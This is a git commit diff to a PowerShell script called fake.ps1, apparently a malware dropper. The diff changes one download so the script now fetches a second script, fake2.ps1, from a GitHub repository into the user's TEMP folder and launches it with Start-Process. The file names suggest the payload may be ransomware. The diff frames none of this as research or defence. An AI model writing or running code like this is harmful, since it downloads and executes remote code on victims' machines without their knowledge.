45d964965d817640fd05d2a95f0883ed065e752a
cia168168 <147810144+cia168168@users.noreply.github.com>
2023-11-21 21:19:46 +0700

    Update fake.ps1

--- fake/fake.ps1
+++ fake/fake.ps1
@@ -6,7 +6,7 @@ $url2 = "https://github.com/cia168168/folder/raw/main/fake/ransd.png"
 $output2 = "$env:TEMP\ransd.png"
 Invoke-WebRequest -Uri $url2 -OutFile $output2
 
-$url3 = "https://github.com/cia168168/folder/raw/main/fake/ransd.png"
-$output3 = "$env:TEMP\ransd.png"
+$url3 = "https://github.com/cia168168/folder/raw/main/fake/fake2.ps1"
+$output3 = "$env:TEMP\fake2.ps1"
 Invoke-WebRequest -Uri $url3 -OutFile $output3
 Start-Process $output3
